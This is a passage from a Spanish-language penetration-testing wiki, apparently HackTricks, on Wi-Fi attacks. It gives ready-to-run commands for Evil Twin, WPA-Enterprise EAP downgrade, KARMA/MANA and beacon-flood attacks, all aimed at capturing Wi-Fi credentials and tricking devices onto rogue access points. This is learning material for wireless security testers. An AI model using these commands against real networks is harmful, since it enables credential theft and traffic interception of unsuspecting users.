- **Desafíos en la ejecución**: Ejecutar con éxito un ataque Evil Twin en entornos con múltiples access points bien colocados puede ser difícil. Deauthenticating un único access point legítimo a menudo hace que el dispositivo se conecte a otro access point legítimo, a menos que el atacante pueda deauthenticating todos los access points cercanos o colocar estratégicamente el rogue access point.

Puedes crear un Open Evil Twin muy básico (sin capacidades para enrutar tráfico a Internet) haciendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
También puedes crear un Evil Twin usando **eaphammer** (ten en cuenta que para crear evil twins con eaphammer la interface **no debe estar** en modo **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
O usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Por favor, ten en cuenta que por defecto si un ESSID en el PNL está guardado como protegido por WPA, el dispositivo no se conectará automáticamente a un Evil Twin abierto. Puedes intentar DoS al AP real y esperar que el usuario se conecte manualmente a tu Evil Twin abierto, o puedes DoS al AP real y usar un WPA Evil Twin para capturar el handshake (usando este método no podrás permitir que la víctima se conecte a ti ya que no conoces el PSK, pero puedes capturar el handshake e intentar romperlo).

_Algunos OS y AV advertirán al usuario de que conectarse a una red abierta es peligroso..._

### WPA/WPA2 Evil Twin

Puedes crear un **Evil Twin usando WPA/2** y si los dispositivos están configurados para conectarse a ese SSID con WPA/2, intentarán conectarse. De todas formas, **para completar el 4-way-handshake** también necesitas **conocer** la **contraseña** que el cliente va a usar. Si **no la conoces**, la **conexión no se completará**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender este ataque, recomiendo leer primero la breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` necesita un archivo **configuración** para funcionar. Para **automatizar** la generación de estas configuraciones puedes usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (descarga el archivo Python dentro de _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
En el archivo de configuración puedes seleccionar muchas cosas diferentes como ssid, channel, user files, cret/key, dh parameters, wpa version y auth...

[**Usando hostapd-wpe con EAP-TLS para permitir que cualquier certificado inicie sesión.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por defecto, EAPHammer utiliza estos métodos de autenticación (observe que GTC es el primero en intentar obtener plaintext passwords, seguido por el uso de métodos de autenticación más robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta es la metodología predeterminada para evitar largos tiempos de conexión. Sin embargo, también puedes especificar al servidor los métodos de autenticación de los más débiles a los más fuertes:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (contraseñas en texto plano)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (ofrecer los mismos métodos de autenticación en el mismo orden que la organización hará que el ataque sea mucho más difícil de detectar).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` te ofrece la posibilidad de una **continuous Evil Twin attack (noisy)** o **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## Ataque KARMA, MANA, Loud MANA y Known beacons

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- El AP malicioso responderá solo a probe requests de dispositivos especificados en la whitelist, permaneciendo invisible para todos los demás que no estén listados.
2. **MAC-based Blacklist**:
- El AP malicioso ignorará probe requests de dispositivos en la blacklist, haciendo efectivamente que el AP malicioso sea invisible para esos dispositivos específicos.
3. **SSID-based Whitelist**:
- El AP malicioso responderá a probe requests solo para ESSIDs específicos listados, haciéndolo invisible para dispositivos cuyas Preferred Network Lists (PNLs) no contengan esos ESSIDs.
4. **SSID-based Blacklist**:
- El AP malicioso no responderá a probe requests para los ESSIDs específicos en la blacklist, haciéndolo invisible para dispositivos que buscan esas redes particulares.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este método permite a un **attacker crear un malicious access point (AP) que responde a todas las probe requests** de dispositivos que buscan conectarse a networks. Esta técnica **engaña a los devices para que se conecten al attacker’s AP** al imitar las networks que los devices están buscando. Una vez que un device envía una connection request a este rogue AP, completa la conexión, llevando al device a conectarse por error a la network del attacker.

### MANA

Luego, **los devices comenzaron a ignorar las unsolid network responses**, reduciendo la efectividad del karma attack original. Sin embargo, se introdujo un nuevo método, conocido como el **MANA attack**, por Ian de Villiers y Dominic White. Este método implica que el rogue AP **capture las Preferred Network Lists (PNL) de los devices respondiendo a sus broadcast probe requests** con nombres de red (SSIDs) previamente solid por los devices. Este ataque sofisticado elude las protecciones contra el karma attack original explotando la forma en que los devices recuerdan y priorizan las networks conocidas.

El MANA attack opera monitoreando tanto las directed como las broadcast probe requests de los devices. Para las directed requests, registra la MAC address del device y el nombre de red solicitado, agregando esta información a una lista. Cuando se recibe una broadcast request, el AP responde con información que coincide con cualquiera de las networks en la lista del device, incitando al device a conectarse al rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Un ataque Loud MANA es una estrategia avanzada para cuando los dispositivos no usan sondeos dirigidos o cuando sus listas de redes preferidas (PNL) son desconocidas para el atacante. Se basa en el principio de que los dispositivos en la misma área probablemente compartan algunos nombres de red en sus PNL. En lugar de responder de forma selectiva, este ataque transmite respuestas a sondas para cada nombre de red (ESSID) encontrado en las PNL combinadas de todos los dispositivos observados. Este enfoque amplio aumenta la probabilidad de que un dispositivo reconozca una red familiar e intente conectarse al Access Point malicioso (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Cuando el **Loud MANA attack** no sea suficiente, el **Known Beacon attack** ofrece otro enfoque. Este método hace brute-force al proceso de conexión simulando un AP que responde a cualquier nombre de red, recorriendo una lista de ESSIDs potenciales derivada de un wordlist. Esto simula la presencia de numerosas redes, con la esperanza de coincidir con un ESSID dentro del PNL de la víctima, provocando un intento de conexión al AP fabricado. El ataque puede amplificarse combinándolo con la opción `--loud` para un intento más agresivo de atraer dispositivos.

Eaphammer implementó este ataque como un MANA attack donde todos los ESSIDs dentro de una lista son anunciados (también podrías combinar esto con `--loud` para crear un Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

El **Known Beacon Burst attack** consiste en **la transmisión rápida y continuada de beacon frames para cada ESSID listado en un archivo**. Esto crea un entorno denso de redes falsas, aumentando considerablemente la probabilidad de que los dispositivos se conecten al AP malicioso, especialmente cuando se combina con un ataque MANA. Esta técnica aprovecha la velocidad y el volumen para saturar los mecanismos de selección de red de los dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** es un protocolo que permite que los dispositivos se conecten directamente entre sí usando Wi-Fi sin la necesidad de un punto de acceso inalámbrico tradicional. Esta capacidad está integrada en varios dispositivos de Internet of Things (IoT), como impresoras y televisores, facilitando la comunicación directa entre dispositivos. Una característica notable de Wi-Fi Direct es que un dispositivo asume el rol de access point, conocido como group owner, para gestionar la conexión.

La seguridad de las conexiones Wi-Fi Direct se establece mediante **Wi-Fi Protected Setup (WPS)**, que admite varios métodos de emparejamiento seguro, incluyendo:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Estos métodos, especialmente PIN entry, son susceptibles a las mismas vulnerabilidades que WPS en redes Wi-Fi tradicionales, convirtiéndolos en objetivos de vectores de ataque similares.

### EvilDirect Hijacking

**EvilDirect Hijacking** es un ataque específico de Wi-Fi Direct. Refleja el concepto de un Evil Twin pero apunta a conexiones Wi-Fi Direct. En este escenario, un atacante se hace pasar por un group owner legítimo con el objetivo de engañar a los dispositivos para que se conecten a una entidad maliciosa. Este método puede ejecutarse usando herramientas como `airbase-ng` especificando el channel, ESSID y MAC address del dispositivo suplantado:

## Referencias

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Echar un vistazo a [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con Facebook e imitación de WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
